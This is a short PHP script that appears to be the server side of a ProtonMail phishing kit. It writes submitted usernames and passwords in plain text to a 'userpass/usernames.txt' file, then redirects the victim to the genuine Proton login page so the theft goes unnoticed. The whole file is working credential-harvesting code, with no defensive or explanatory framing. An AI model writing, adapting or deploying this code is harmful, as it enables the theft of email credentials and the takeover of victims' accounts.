<?php

file_put_contents("../userpass/usernames.txt", "Protonmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://account.proton.me/pt-br/login');
exit();
?>